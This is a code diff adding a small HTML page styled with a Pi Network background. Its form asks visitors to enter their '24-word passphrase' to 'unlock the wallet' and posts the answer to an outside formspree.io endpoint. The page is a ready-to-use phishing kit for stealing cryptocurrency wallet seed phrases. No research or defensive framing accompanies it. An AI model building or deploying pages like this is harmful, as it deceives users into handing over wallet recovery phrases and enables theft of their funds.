@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Submit Your Message</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: url('file:///U:/code/Pi_Network_wiki.jpg') no-repeat center center fixed;
+            background-size: cover;
+        }
+
+        form {
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        label {
+            color: white; /* Label remains white */
+        }
+
+        input[type="text"] {
+            padding: 10px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            width: 100%;
+            font-size: 16px;
+            color: black;           /* Text in the input will be black */
+            background-color: white; /* Input background is white */
+        }
+
+        input[type="submit"] {
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #6a1b9a;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #8e24aa;
+        }
+    </style>
+</head>
+<body>
+    <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST">
+        <label for="message">Enter your 24-word passphrase here in order to unlock the wallet:</label>
+        <input type="text" id="message" name="message" required>
+        <input type="submit" value="Submit">
+    </form>
+</body>
